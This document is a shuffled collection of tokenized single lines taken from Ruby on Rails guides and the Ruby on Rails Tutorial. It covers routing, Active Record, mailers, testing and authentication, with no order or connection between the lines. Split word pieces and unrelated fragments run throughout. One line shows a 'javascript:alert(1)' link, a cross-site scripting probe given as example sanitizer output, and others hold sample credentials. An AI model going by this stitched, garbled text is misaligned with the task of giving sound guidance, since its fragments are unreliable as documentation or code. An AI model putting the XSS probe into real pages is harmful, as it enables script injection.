▁Note ▁that ▁\ k ode { paginate } ▁take s ▁a ▁hash ▁argument ▁with ▁key ▁\ k ode { : page } ▁and ▁value ▁equal ▁to ▁the ▁page ▁request ed .
▁in ▁Listing ~\ ref { code : test _ helper _ sign _ in } .
▁It ▁offer s ▁a ▁rich er ▁bottom - line ▁at ▁the ▁language ▁level , ▁ target ed ▁both ▁at ▁the ▁development ▁of ▁Rails ▁applications , ▁and ▁at ▁the ▁development ▁of ▁Ruby ▁on ▁Rails ▁itself .
▁You ▁can ▁then ▁refer ▁to ▁those ▁ container s ▁easily ▁by ▁following ▁the ▁convention , ▁instead ▁of ▁ having ▁to ▁think ▁about ▁which ▁class ▁or ▁id ▁attribute ▁you ▁should ▁use .
▁No rm ally ▁this ▁is ▁a ▁feature , ▁since ▁it ▁let s ▁you ▁con t in ue ▁to ▁use ▁the ▁command ▁line ▁after ▁ la un ch ing ▁your ▁editor , ▁but ▁Git ▁interpret s ▁the ▁ de t a ch ment ▁as ▁ closing ▁the ▁file ▁with ▁an ▁empty ▁commit ▁message , ▁which ▁prevent s ▁the ▁commit ▁from ▁going ▁through .
▁You ▁should ▁sub st it ute ▁\ k ode { ' 1▖9▖3 ' } ▁if ▁that ' s ▁the ▁version ▁of ▁Ruby ▁you ' re ▁using , ▁though ▁for ▁this ▁tutorial ▁the ▁difference ▁should n ' t ▁ever ▁matter ▖)
▁To ▁implement ▁the ▁ forwarding ▁itself , ▁we ▁use ▁the ▁\ k ode { redirect \_ back \_ or } ▁\ line break ▁method ▁to ▁redirect ▁to ▁the ▁request ed ▁URL ▁if ▁it ▁exists , ▁or ▁some ▁default ▁URL ▁otherwise , ▁which ▁we ▁add ▁to ▁the ▁Sessions ▁controller ▁\ k ode { create } ▁action ▁to ▁redirect ▁after ▁successful ▁login ▁( Listing ~\ ref { code : friendly _ session _ create }) .
▁ ▖ field _ with _ errors ▁ {
▁That ▁code ▁will ▁pull ▁in ▁the ▁partial ▁from ▁` app / views / shared / _ menu ▖ html ▖ erb ` .
▁So ▁this ▁would ▁be ▁wrong :
▁The ▁third ▁argument , ▁` indent _ empty _ lines `, ▁is ▁a ▁flag ▁that ▁say s ▁whether ▁empty ▁lines ▁should ▁be ▁ indent ed ▖
▁D if f er ent ▁ contributors ▁will ▁some times ▁have ▁different ▁ o p in ion s , ▁and ▁often ╼ patch es ▁will ▁need ▁re v is ed ▁before ▁they ▁can ▁get ▁merge d .
▁As ▁a ▁result , ▁we ' ll ▁ s p end ▁most ▁of ▁our ▁time ▁in ▁our ▁text ▁editor ▁and ▁browser , ▁using ▁ TDD ▁only ▁to ▁add ▁a ▁Contact ▁page ▁( Section ~\ ref { sec : contact _ page }) .
▁* ▁` re order `
▁Find ing ▁the ▁current ▁user ▁using ▁the ▁\ k ode { remember \_ token } .
▁As ▁the ▁previous ▁example ▁shows , ▁Active ▁Support ▁know s ▁some ▁ ir regular ▁plural s ▁and ▁un count able ▁no un s ▖
▁There ' s ▁also ▁[ S pre e ]( https :// github ▖ com / s pre e / s pre e ) ▁which ╼ provide s ▁an ▁e - com m er ce ▁platform , ▁and ╼[ Re f in er y C M S ]( https :// github ▖ com / ref in er y / ref in er y cm s ), ▁a ▁C M S ▁engine .
▁at ▁least ▁one ▁letter , ▁di git , ▁hyphen , ▁or ▁do t
▁def ▁set _ business _ headers
▁To ▁use ▁ bcrypt ▁in ▁the ▁sample ▁application , ▁we ▁need ▁to ▁add ▁the ▁\ k ode { bcrypt } ▁gem ▁to ▁our ▁\ k ode { Gemfile } ▁( Listing ~\ ref { code : bcrypt _ ruby }) .
▁module ▁ Y
▁You ▁can ▁pass ▁in ▁a ▁ numeric al ▁argument ▁to ▁the ▁` take ` ▁method ▁to ▁return ▁up ▁to ▁that ▁number ▁of ▁results ▖
▁By ▁convention , ▁Rails ▁ assumes ▁that ▁the ▁column ▁in ▁the ▁join ▁table ▁used ▁to ▁hold ▁the ▁foreign ▁key ▁point ing ▁to ▁the ▁other ▁model ▁is ▁the ▁name ▁of ▁that ▁model ▁with ▁the ▁ suffix ▁` _ id ` ▁added ▖
▁In ▁particular , ▁the ▁signin ▁failure ▁tests ▁are ▁current ly ▁passing :
▁require ▁" p ry "
▁NOTE : ▁All ▁the ▁following ▁methods ▁are ▁defined ▁in ▁` active _ support / core _ ext / date _ time / calculations ▖ rb ` .
▁ invoice ▖ lines ▖ to _ formatted _ s (: db ) ▁# ▁=> ▁" 23 , 5 67 , 55 6 , 12 "
▁Check ▁the ▁[ sass - rails ▁documentation ]( https :// github ▖ com / rails / sass - rails # feature s ) ▁for ▁more ▁ info ▁and ▁important ▁c a ve at s .
▁Fix ing ▁this ▁blemish ▁requires ▁a ▁significant ly ▁more ▁complicated ▁regular ▁expression ▁and ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : modeling _ users _ exercises })▖)
▁" digest ":" 23 1 a 6 80 f 2 38 87 d 9 d d 7 07 10 ea 5 e fd 3 c 6 2 "} }, " assets ":{" application ▖ js " :
▁* ▁` assets ` ▁allows ▁to ▁create ▁assets ▁on ▁ generating ▁a ▁scaffold ▖
▁<% ▁if ▁@ article ▖ errors ▖ any ?
▁A r g u ment s ▁may ▁be ▁bar e ▁constant ▁names :
▁for ▁ severity ▁in ▁S ever ity ▖ constant s
▁By ▁the ▁way , ▁if ▁you ' re ▁ com for table ▁with ▁exception s ▁in ▁Ruby , ▁you ▁could ▁also ▁write ▁the ▁\ k ode { correct \_ user } ▁filter ▁like ▁this :
▁has _ many ▁: appointment s
▁This ▁is ▁a ▁long ▁and ▁action - p ac k ed ▁chapter , ▁and ▁you ▁may ▁find ▁it ▁un us u ally ▁challenging , ▁es pecially ▁if ▁you ▁are ▁new ▁to ▁data ▁ modeling .
▁The ▁way ▁to ▁change ▁the ▁links ▁in ▁the ▁site ▁layout ▁involve s ▁using ▁an ╼ if - else ▁branch ing ▁structure ▁inside ▁of ▁ Embedded ▁Ruby :
▁By ▁modify ing ▁the ▁user ▁information ▁and ▁click ing ▁the ▁ Update ▁User ▁button , ▁we ▁arrange ▁to ▁change ▁the ▁information ▁for ▁the ▁user ▁in ▁the ▁toy ▁application ▁( Figure ~\ ref { fig : demo _ update _ user _ rails _3} ) .
▁* ▁Validat e ▁models ▁before ▁they ▁get ▁persist ed ▁to ▁the ▁database .
▁# ▁=> ▁"< p >< a ▁ href =" javascript : alert (1) "> hello </ a ></ p > "
▁Note ▁the ▁added ▁\ k ode { require } .
▁" ▁ foo "▖ indent (2) ▁# ▁=> ▁" ▁ foo "
▁To ▁create ▁the ▁new ▁model ,╼ run ▁this ▁command ▁in ▁your ▁terminal :
▁# ▁do ▁something ▁with ▁the ▁job ▁instance
▁We ▁can ▁see ▁the ▁result ▁of ▁the ▁before ▁filter ▁in ▁Listing ~\ ref { code : authorize _ before _ filter } ▁by ▁logging ▁out ▁and ▁attempt ing ▁to ▁access ▁the ▁user ▁edit ▁page ▁\ href { http ://0▖0▖0▖0:3000/ users /1/ edit }{/ users /1/ edit }, ▁as ▁seen ▁in ▁Figure ~\ ref { fig : protected _ log _ in } .
▁Rails ▁would ▁match ▁` photos / 12 ` ▁to ▁the ▁` show ` ▁action ▁of ▁` PhotosController `, ▁and ▁set ▁` params [: format ]` ▁to ▁` " jpg " ` .
▁* ▁ serv ing ▁static ▁assets :
▁as ▁show n ▁in ▁Listing ~\ ref { code : password _ reset _ mailer _ test } .
▁as ▁show n ▁in ▁Listing ~\ ref { code : development _ debugger } .
▁#### # ▁`: touch `
▁clients ▁= ▁Client ▖ limit (10)
▁On ce ▁users ▁can ▁sign ▁up , ▁we ' ll ▁let ▁them ▁log ▁in ▁and ▁log ▁out ▁as ▁well ▁( Chapter ~\ ref { cha : log _ in _ log _ out }), ▁and ▁in ▁Chapter ~\ ref { cha : updating _ showing _ and _ deleting _ users } ▁( Section ~\ ref { sec : requiring _ logged _ in _ users }) ▁we ' ll ▁learn ▁how ▁to ▁protect ▁pages ▁from ▁ im p r o p er ▁access .
▁* ▁Pass ▁the ▁file ▁name ▁and ▁content ▁and ▁Action ▁Mailer ▁and ▁the ╼ ▁[ Mail ▁gem ]( https :// github ▖ com / m i k el / mail ) ▁will ▁automatically ▁guess ▁the ╼ ▁ mime _ type , ▁set ▁the ▁encoding ▁and ▁create ▁the ▁ attachment .
▁in ▁Listing ~\ ref { code : signin _ feature s } .
▁Tests ▁for ▁the ▁( proto - ) status ▁feed .
▁def ▁article _ params
▁url : ▁ postgresql :// localhost / blog _ development ?
▁* ▁Rails ▁4▖0 ▁ deprecated ▁` ActionController :: Abstract Response ` ▁in ▁favor ▁of ▁` ActionDispatch :: Response ` .
▁The ▁\ k ode { logged \_ in ?}\
▁We ▁can ▁see ▁what ▁happens ▁without ▁a ▁save ▁by ▁using ▁\ k ode { reload }, ▁which ▁ reload s ▁the ▁object ▁base d ▁on ▁the ▁database ▁information :
▁Unix ▁process es
▁Because ▁Ruby ▁uses ▁ CamelCase ▁for ▁class ▁names ▁( Section ~\ ref { sec : ruby _ classes }), ▁my ▁prefer ence ▁is ▁to ▁refer ▁to ▁controllers ▁using ▁their ▁ CamelCase ▁names , ▁but ▁this ▁is ▁a ▁matter ▁of ▁taste .
▁* ▁` initialize _ cache ` ▁If ▁` Rails ▖ cache ` ▁isn ' t ▁set ▁yet , ▁ initialize s ▁the ▁cache ▁by ▁refer en c ing ▁the ▁value ▁in ▁` config ▖ cache _ store ` ▁and ▁store s ▁the ▁out com e ▁as ▁` Rails ▖ cache ` ▖
▁The ▁first ▁refactoring ▁attempt ▁at ▁the ▁index ▁view .
▁< small >
▁* ▁`: argument s ` ▁- ▁The ▁command ▁line ▁arguments ▖
▁In ▁the ▁context ▁of ▁the ▁current ▁user , ▁this ▁suggest s ▁the ▁following ▁construction :
▁We ▁could ▁do ▁this ▁by ▁hand ▁with ▁a ▁browser , ▁first ▁visit ing ▁the ▁root ▁path ▁and ▁then ▁check ing ▁the ▁links ▁by ▁hand , ▁but ▁this ▁quickly ▁becomes ▁cumbersome .
▁render ▁ html : ▁"< strong > Not ▁F ound </ strong > "▖ html _ safe
▁create _ table ▁: public ation s ▁do ▁| t |
▁xml ▖ description ▁" Base c amp : ▁Re c ent ▁ items "
▁They ▁do ▁not ▁have ▁far - future ▁headers ▁by ▁default , ▁so ▁to ▁get ▁the ▁benefit ▁of ╼ f ing er print ing ▁you ' ll ▁have ▁to ▁update ▁your ▁server ▁configuration ▁to ▁add ▁those ╼ headers .
▁set _ callback ▁: save , ▁: ar ound , ▁-> ( r , ▁block ) ▁ { ▁ stuff ; ▁result ▁= ▁block ▖ call ; ▁ stuff ▁ }
▁The ▁\ k ode { followed } ▁association ▁isn ' t ▁actually ▁needed ▁un til ▁Section ~\ ref { sec : followers }, ▁but ▁the ▁parallel ▁ follower / followed ▁structure ▁is ▁clear er ▁if ▁we ▁implement ▁them ▁both ▁at ▁the ▁same ▁time .
▁N est ed ▁routes ▁allow ▁you ▁to ▁capture ▁this ▁relationship ▁in ▁your ▁routing ▖
▁The ▁` has _ many ▁: through ` ▁association ▁is ▁also ▁useful ▁for ▁setting ▁up ▁" shortcuts " ▁through ▁nested ▁` has _ many ` ▁associations ▖
▁If ▁an ▁exception ▁is ▁raised ▁during ▁the ▁execut ion ▁of ▁the ▁block ▁and ▁is ▁` k in d _ of ?` ▁any ▁of ▁the ▁arguments , ▁` suppress ` ▁capture s ▁it ▁and ▁returns ▁ s ile nt ly ▖
▁C ur r ent ly , ▁there ▁is ▁no ▁way ▁for ▁users ▁to ▁find ▁each ▁other , ▁a part ▁from ▁pa g ing ▁through ▁the ▁user ▁index ▁or ▁view ing ▁the ▁feed s ▁of ▁other ▁users .
▁# ▁Generate s ▁a ▁select ▁field ▁for ▁f ive ▁ years ▁on ▁either ▁ side ▁of ▁Date ▖ today ▁that ▁defaults ▁to ▁the ▁current ▁ year
▁In ▁order ▁to ▁test ▁the ▁form ▁submission , ▁we ▁need ▁to ▁issue ▁a ▁\ text tt { POST } ▁request ▁to ▁the ▁\ k ode { users \_ path } ▁( Table ~\ ref { table : table - RESTful _ users }), ▁which ▁we ▁can ▁do ▁with ▁the ▁\ k ode { post } ▁function :
▁Let ' s ▁also ▁make ▁a ▁text ▁part ▁for ▁this ▁email ▖
▁ Fi ll ing ▁in ▁the ▁comments ▁with ▁code ▁lead s ▁to ▁the ▁\ k ode { log \_ in \_ as } ▁helper ▁method ▁show n ▁in ▁Listing ~\ ref { code : test _ helper _ log _ in } .
▁Listing ~\ ref { code : valid _ user _ test } ▁uses ▁the ▁plain ▁\ k ode { assert } ▁method , ▁which ▁in ▁this ▁case ▁succeed s ▁if ▁\ k ode {@ user ▖ valid ?}\ ▁returns ▁\ k ode { true } ▁and ▁fails ▁if ▁it ▁returns ▁\ k ode { false } .
▁% w ( Earth ▁Wi nd )▖ to _ sentence ▁# ▁=> ▁" Earth ▁and ▁Wi nd "
▁custom _ helpers ▁( end )╼╼ ▁% ▁section ▁ motivation ▁( end )╼╼ ▁\ section { String s ▁and ▁methods } ▁% ▁( fold )╼ ▁\ label { sec : string s _ and _ methods }╼╼
▁The ▁\ k ode { rails ▁new } ▁command ▁( Listing ~\ ref { code : rails _ new _ sample _ app }) ▁creates ▁a ▁layout ▁file ▁by ▁default , ▁but ▁it ' s ▁in str u c tive ▁to ▁ignore ▁it ▁initially , ▁which ▁we ▁can ▁do ▁by ▁changing ▁its ▁name :
▁If ▁you ▁set ▁the ▁`: dependent ` ▁option ▁to :
▁The ▁\ k ode { second } ▁method ▁used ▁here ▁isn ' t ▁current ly ▁part ▁of ▁Ruby ▁itself , ▁but ▁rather ▁is ▁added ▁by ▁Rails .
▁If ▁an ▁update ▁request ▁is ▁made ▁with ▁a ▁lower ▁value ▁in ▁the ▁` lock _ version ` ▁field ▁than ▁is ▁current ly ▁in ▁the ▁` lock _ version ` ▁column ▁in ▁the ▁database , ▁the ▁update ▁request ▁will ▁fail ▁with ▁an ▁` ActiveRecord :: StaleObjectError ` ▖
▁B in ary ▁execut able ▁files
▁Rails ▁is ▁used ▁by ▁ com p an ies ▁as ▁d ivers e ▁as ▁\ href { http :// a i rb n b ▖ com /}{ A i rb n b }, ▁\ href { http :// base c amp ▖ com /}{ Base c amp }, ▁\ href { http :// d isney ▖ com /}{ D isney }, ▁\ href { http :// github ▖ com /}{ GitHub }, ▁\ href { http :// h ul u ▖ com /}{ H ul u }, ▁\ href { http :// k ic k start er ▖ com /}{ K ic k start er }, ▁\ href { http :// s hopify ▖ com /}{ S hopify }, ▁\ href { http :// twitter ▖ com /}{ Twitter }, ▁and ▁the ▁\ href { http :// y ellow pages ▖ com /}{ Y ellow ▁Pages } .
▁Action ▁Dispatch er ▁ Middleware ▁ Stack
▁generates ▁something ▁like ▁this :
▁This ▁is ▁where ▁we ▁want ▁the ▁comment ▁to ▁show , ▁so ▁let ' s ╼ add ▁that ▁to ▁the ▁` app / views / articles / show ▖ html ▖ erb ` .
▁ //= ▁require ▁ jquery
▁#### # ▁` association ( force _ reload ▁= ▁false ) `
▁ Validations ▁are ▁typical ly ▁run ▁before ▁these ▁commands ▁are ▁sent ▁to ▁the ╼ database ▖
▁A ▁relation ▁which ▁has ▁used ▁` unscope ` ▁will ▁a ffect ▁any ▁relation ▁it ▁is ╼ merge d ▁in ▁to :
▁However , ▁associations ╼ that ▁contain ▁the ▁following ▁options ▁will ▁not ▁have ▁their ▁ inverse s ▁set ╼ a utomatically :
▁Note ▁the ▁use ▁of ▁ strong ▁parameters ▁via ▁\ k ode { micropost \_ params }, ▁which ▁ permit s ▁only ▁the ▁micropost ▁content ▁to ▁be ▁edit ed ▁through ▁the ▁web .
▁The ▁method ▁` assert _ valid _ keys ` ▁receive s ▁an ▁arbitrar y ▁number ▁of ▁arguments , ▁and ▁check s ▁whether ▁the ▁receiver ▁has ▁any ▁key ▁out side ▁that ▁ white ▁list ▖
▁ )
▁A nother ▁common ╼ sy mp to m ▁is ▁characters ▁like ▁" Ã 1 ⁄ 4 " ▁appear ing ▁instead ▁of ▁" ü "▖
▁### ▁Re mov e ▁: cache ▁and ▁: concat ▁options ▁in ▁asset ▁helpers ▁ references ▁in ▁views
▁We ' ll ▁con t in ue ▁this ▁the me ▁by ▁using ▁a ▁\ k ode { destroy } ▁action ▁to ▁delete ▁sessions , ▁i ▖ e ▖ , ▁to ▁sign ▁out .
▁# ▁Generate s ▁class ▁methods ▁to ▁access ▁@ @ emulate _ boolean s ▁with ▁default ▁value ▁of ▁true .
▁root ▁GET ▁ / ▁ welcome # index
▁The ▁list ▁of ▁email s ▁can ▁be ▁an ▁array ▁of ▁email ▁addresses ▁or ▁a ▁single ▁string ╼ with ▁the ▁addresses ▁separate d ▁by ▁ com ma s .
▁mail ▖ perform _ deliveries ▁= ▁false
▁in ▁Listing ~\ ref { code : before _ create _ activation _ digest } .
▁` Rails ▖ application ` ▁is ▁the ▁primary ▁Rack ▁application ▁object ▁of ▁a ▁Rails ╼ application ▖
▁#### ▁Rendering ▁an ▁Action ' s ▁ Template ▁from ▁A nother ▁Controller
▁git @ heroku ▖ com : st or my - cloud - 5 88 1 ▖ heroku app ▖ com
▁ Each ▁action ▁needs ▁to ▁set ▁a ▁title , ▁find ▁the ▁user , ▁retrieve ▁either ▁\ k ode {@ user ▖ following } ▁or ▁\ k ode {@ user ▖ followers } ▁( in ▁ paginate d ▁form ), ▁and ▁then ▁render ▁the ▁page .
▁</ footer >
▁Next , ▁we ' ll ▁create ▁an ▁instance ▁variable ▁containing ▁the ▁user ▁( for ▁use ▁in ▁the ▁view ), ▁and ▁then ▁mail ▁the ▁result ▁to ▁\ k ode { user ▖ email } ▁( Listing ~\ ref { code : mail _ account _ activation }) .
▁S ince ▁` dup ` ▁does ▁not ▁make ▁ deep ▁copy , ▁the ▁string ▁inside ▁the ▁array ▁is ▁ still ▁the ▁same ▁object .
▁The ▁CSS ▁for ▁microposts ▁( including ▁all ▁the ▁CSS ▁for ▁this ▁chapter ) .
▁The ▁problem ▁is ▁that ▁we ▁want ▁the ▁microposts ▁to ▁exist ▁immediately , ▁so ▁that ▁the ▁timestamp s ▁are ▁in ▁the ▁right ▁order ▁and ▁so ▁that ▁\ k ode {@ user ▖ microposts } ▁isn ' t ▁empty ▖ ▁We ▁accomplish ▁this ▁with ▁\ k ode { let !} , ▁which ▁ force s ▁the ▁corresponding ▁variable ▁to ▁come ▁into ▁exist ence ▁immediately .
▁ Experience d ▁Rails ▁developers ▁m ight ▁have ▁expected ▁the ▁use ▁of ▁\ k ode { content \_ for } ▁at ▁this ▁point , ▁but ▁it ▁doesn ' t ▁work ▁well ▁with ▁the ▁asset ▁pipeline .
▁In ▁addition ▁to ▁focus ing ▁on ▁general ▁principle s ▁of ▁web ▁development ▁( ra the r ▁than ▁on ▁Rails ▁specifically ), ▁the ▁\ r or t \ ▁teach es ▁the ▁br o ad er ▁ s kill ▁of ▁\ emph { technical ▁ sophistication } ▁( Bo x ~\ ref { aside : technical _ sophistication }), \ foot note { \ xkcd use ▖ } ▁which ▁is ▁a ▁principal ▁the me ▁ developed ▁by ▁the ▁\ let b d \ ▁tutorial s ▖ \ foot note { learn en ough ▖ com / s to ry } ▁In ▁particular , ▁the ▁ Learn ▁En ough ▁introduc to ry ▁ sequence ▁consist s ▁of ▁a ▁series ▁of ▁tutorial s ▁that ▁are ▁suit able ▁as ▁ prerequisites ▁to ▁the ▁\ r or t , ▁starting ▁with ▁\ le c l , \ foot note { learn en ough ▖ com / command - line } ▁which ▁( un like ▁the ▁present ▁tutorial ) ▁is ▁a im ed ▁at ▁complete ▁beginners ▖ ╼╼ ╼\ begin { aside }╼\ label { aside : technical _ sophistication }╼\ head ing { Technical ▁ sophistication }╼╼ The ▁\ r or t \ ▁is ▁part ▁of ▁the ▁\ let b d \ ▁ fa m ily ▁of ▁tutorial s , ▁which ▁develop ▁the ▁the me ▁of ▁\ emph { technical ▁ sophistication } : ▁the ▁combination ▁of ▁hard ▁and ▁so f t ▁ s kill s ▁that ▁make ▁it ▁seem ▁like ▁you ▁can ▁magic ally ▁solve ▁any ▁technical ▁problem ▁( Figure ~\ ref { fig : tech _ support _ cheat _ sheet }) ▖ ▁Web ▁development , ▁and ▁computer ▁programming ▁in ▁general , ▁are ▁essential ▁ components ▁of ▁technical ▁ sophistication , ▁but ▁there ' s ▁more ▁to ▁it ▁than ▁that --- you ▁also ▁have ▁to ▁know ▁how ▁to ▁click ▁around ▁ menu ▁ items ▁to ▁learn ▁the ▁cap a b i li t ies ▁of ▁a ▁particular ▁application , ▁how ▁to ▁c la ri fy ▁a ▁confusing
▁### ▁ Control l ing ▁ Caching
▁ http _ basic _ authenticate _ with ▁name : ▁" d h h ", ▁password : ▁" secret ", ▁except : ▁ [: index , ▁: show ]
▁A ▁user ▁profile ▁with ▁a ▁follow ▁button ▁(\ href { http ://0▖0▖0▖0:3000/ users / 2 }{/ users / 2 }) .
▁It s ▁purpose ▁is ▁just ▁to ▁give ▁you ▁a ▁taste ▁of ▁Cucumber ▁( c ri s p ▁and ▁ j u ic y , ▁no ▁do ub t ) --- if ▁it ▁ st ri k es ▁your ▁f an c y , ▁there ▁are ▁entire ▁ books ▁on ▁the ▁subject ▁wait ing ▁to ▁ satisf y ▁your ▁app e t ite .
▁The ▁bottom ▁ port ion ╼ provide s ▁a ▁form ▁to ▁create ▁a ▁new ▁user .
▁| ▁| ▁20 7 ▁| ▁: multi _ status ▁|
▁Re start ▁your ▁server .
▁# ▁</ objects >
▁There ' s ▁an ▁ additional ▁detail ▁we ▁need ▁to ▁address ▁re g ar d ing ▁our ▁application ' s ▁data ▁model : ▁unlike ▁ sy m me tr ic ▁ Facebook - style ▁f ri end ship s , ▁which ▁are ▁always ▁re ci proc al ▁( at ▁least ▁at ▁the ▁data - model ▁level ), ▁Twitter - style ▁following ▁relationships ▁are ▁ potentially ▁\ emph { as y m me tr ic } --- Calvin ▁can ▁follow ▁ Hobbes ▁without ▁ Hobbes ▁following ▁ Calvin .
▁The ▁difference ▁between ▁them ▁is ▁the ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / HTTP _ request # Request _ methods } { HTTP ▁request ▁method } ▁they ▁respond ▁to .
▁[ 2, ▁4 , ▁6 , ▁ 8, ▁10 ] ▖ sum ▁# ▁=> ▁30
▁Get ▁help ▁on ▁the ▁Ruby ▁on ▁Rails ▁Tutorial ▁at ▁the
▁ Comm on ▁validations ▁include ▁presence , ▁length , ▁and ▁format .
▁Route s ▁inside ▁an ▁engine ▁are ▁ isolate d ▁from ▁the ▁application ▁by ▁default ▖
▁### ▁Listing ▁E x ist ing ▁Route s
▁As sum ing ▁that ▁the ▁`@ customer ` ▁instance ▁variable ▁contains ▁an ▁instance ▁of ▁the ▁` Customer ` ▁model , ▁this ▁will ▁use ▁` _ customer ▖ html ▖ erb ` ▁to ▁render ▁it ▁and ▁will ▁pass ▁the ▁local ▁variable ▁` customer ` ▁into ▁the ▁partial ▁which ▁will ▁refer ▁to ▁the ▁`@ customer ` ▁instance ▁variable ▁in ▁the ▁ parent ▁view .
▁Note ▁that ▁we ' ve ▁added ▁a ▁second ▁test , ▁which ▁check s ▁that ▁the ▁current ▁user ▁is ▁\ k ode { nil } ▁if ▁the ▁user ' s ▁remember ▁digest ▁doesn ' t ▁correspond ▁correctly ▁to ▁the ▁remember ▁token , ▁there by ▁testing ▁the ▁\ k ode { authenticated ?}\ ▁expression ▁in ▁the ▁nested ▁\ k ode { if } ▁statement :
▁ http :// rails - tutorial - c 9 - mhartl ▖ c 9 ▖ io / account _ activations / ╼ f F b _ F 9 4 m g Q t m l S v R F G s IT w / edit ?
▁ suppress ( ActiveRecord :: StaleObjectError ) ▁do
▁S ince ▁there ▁are ▁two ▁ways ▁to ▁set ▁your ▁connection , ▁via ▁environment ▁variable ▁it ▁is ▁important ▁to ▁understand ▁how ▁the ▁two ▁can ▁interact .
▁Active ▁Record ▁allows ▁us ▁to ▁ im po se ▁such ▁constraints ▁using ▁\ emph { validations } .
▁to ▁escape ▁the ▁test ▁user ' s ▁email
▁Then ▁use ▁the ▁\ k ode { heroku } ▁command ▁to ▁log ▁in ▁at ▁the ▁command ▁line ▁( you ▁may ▁have ▁to ▁ ex it ▁and ▁restart ▁your ▁terminal ▁program ▁first ) :
▁If ▁not ▁found ,╼ the n ▁it ▁will ▁attempt ▁to ▁load ▁a ▁template ▁called ▁` application / new ` ▖
▁" DateTime " ▁=> ▁" datetime ",
▁An y ▁accidental ▁ ex po sure ▁of ▁the ▁edit ▁methods ▁to ▁un authorize d ▁users ▁will ▁now ▁be ▁c a ug h t ▁immediately ▁by ▁our ▁test ▁suite .
▁#### ▁ Adding ▁Co ll ec tion ▁Route s
▁It ' s ▁not ▁just ▁you ; ▁every ▁developer ▁go es ▁through ▁it ▁( of t en ▁more ▁than ▁once ), ▁but ▁rest ▁as sure d ▁that ▁the ▁effort ▁will ▁be ▁rich ly ▁re ward ed .
▁Active ▁Record ▁is ▁the ▁M ▁in ▁[ MVC ]( getting _ started ▖ html # the - mvc - ar ch ite c t ure ) ▁- ▁the ╼ model ▁- ▁which ▁is ▁the ▁layer ▁of ▁the ▁system ▁responsib le ▁for ▁represent ing ▁ business ╼ data ▁and ▁logic ▖
▁This ▁will ▁render ▁the ▁template ▁' another _ template ▖ html ▖ erb ' ▁for ▁the ▁HTML ▁part ▁and ╼ use ▁the ▁rendered ▁text ▁for ▁the ▁text ▁part ▖
▁Instead , ▁we ▁need ▁to ▁redirect ▁to ▁a ▁different ▁page , ▁and ▁it ▁make s ▁sense ▁for ▁that ▁page ▁to ▁be ▁the ▁new ly ▁created ▁user ' s ▁profile .
▁It ▁defaults ▁to ▁ "1" ▁and ▁can ▁be ▁easily ▁changed .
▁### ▁ Learn ing ▁Rack
▁Code ▁for ▁the ▁About ▁page ▖
▁My J ob ▖ set ( queue : ▁: another _ queue )▖ perform _ later ( record )
▁Recall ing ▁that ▁the ▁signup ▁page ▁ / signup ▁is ▁route d ▁to ▁the ▁\ k ode { new } ▁action ▁in ▁the ▁Users ▁controller ▁( Listing ~\ ref { code : signup _ route }), ▁our ▁first ▁step ▁is ▁to ▁create ▁the ▁User ▁object ▁required ▁as ▁an ▁argument ▁to ▁\ k ode { form \_ for } .
▁The ▁Home ▁page ▁at ▁the ▁root ▁route .
▁The ▁ simplified ▁user ▁\ k ode { index } ▁action ▁for ▁the ▁toy ▁application .
▁The ▁default ▁error ▁message ▁is ▁_" is ▁re serv ed " _ .
▁My ▁favor ite ▁way ▁to ▁handle ▁this ▁kind ▁of ▁situation ▁is ▁to ▁raise ▁an ▁exception ▁in ▁the ▁suspect ed ▁un test ed ▁block ▁of ▁code : ▁if ▁the ▁code ▁isn ' t ▁covered , ▁the ▁tests ▁will ▁ still ▁pass ; ▁if ▁it ▁is ▁covered , ▁the ▁result ing ▁error ▁will ▁identify ▁the ▁relevant ▁test ▖ ▁The ▁result ▁in ▁the ▁present ▁case ▁appears ▁in ▁Listing ~\ ref { code : branch _ raise } .
▁On ce ▁you ▁have ▁a ▁lot ▁of ▁experience ▁ modeling ▁a ▁particular ▁domain , ▁you ▁can ▁often ▁guess ▁such ▁ utility ▁methods ▁in ▁ advance , ▁and ▁even ▁when ▁you ▁can ' t ▁you ' ll ▁often ▁find ▁yourself ▁writing ▁them ▁to ▁make ▁the ▁tests ▁ cleaner .
▁It ' s ▁worth ▁noting ▁that ▁our ▁test ▁suite ▁cover s ▁most ▁of ▁the ▁authentication ▁machinery , ▁but ▁not ▁all ▁of ▁it .
▁### ▁Running ▁Tests
▁The ▁expression ▁above ▁does ▁have ▁one ▁we a k ness , ▁though : ▁it ▁allows ▁invalid ▁addresses ▁such ▁as ▁\ k ode { foo @ bar ▖ ▖ com } ▁that ▁contain ▁con sec u tive ▁do t s .
▁You ▁can ▁also ▁do ▁that ▁with ▁` render `, ▁which ▁accept s ▁the ▁full ▁path ▁( relative ▁to ▁` app / views ` ) ▁of ▁the ▁template ▁to ▁render ▖
▁perform s ▁the ▁count ▁directly ▁in ▁the ▁database ▖)
▁A ▁test ▁for ▁the ▁reject ion ▁of ▁duplicate ▁email ▁addresses , ▁ insensitive ▁to ▁case .
▁| ▁key ▁| ▁key _ le n ▁| ▁ ref ▁| ▁rows ▁| ▁ Extra ▁|
▁The ▁same ▁re m ar k s ▁about ▁ ordering ▁made ▁above ▁apply ▖
▁2 ) ▁# ▁=> ▁false
▁You ▁can ▁disable ▁the ▁asset ▁pipeline ▁while ▁creating ▁a ▁new ▁application ▁by ╼ passing ▁the ▁`-- skip - sprockets ` ▁option .
▁ Array ▖ wrap ( foo : ▁: bar ) ▁# ▁=> ▁[ { : foo => : bar } ]
▁The ▁improve d ▁\ k ode { README } ▁file ▁ formatted ▁with ▁ Markdown .
▁A ▁test ▁for ▁the ▁email ▁downcas ing ▁from ▁Listing ~\ ref { code : email _ downcase } .
▁The ▁CoffeeScript ▁in ▁rails ▖ js ▁then ▁list en s ▁for ▁these ╼ attributes , ▁and ▁a tt a ch es ▁appropriate ▁handle rs .
▁The ▁ inverse ▁of ▁\ k ode { create } ▁is ▁\ k ode { destroy } :
▁We ▁can ▁add ▁the ▁feed ▁to ▁the ▁Home ▁page ▁by ▁rendering ▁the ▁feed ▁partial ▁as ▁usual ▁( Listing ~\ ref { code : home _ with _ feed }) .
▁This ▁will ▁allow ▁us ▁to ▁design ▁the ▁look ▁and ▁feel ▁of ▁the ▁web ▁pages ▁first , ▁def er r ing ▁the ▁back - end ▁functionality ▁un til ▁later ▁in ▁this ▁section .
▁The ▁error ▁occur r ed ▁while ▁evaluat ing ▁nil ▖ empty ?
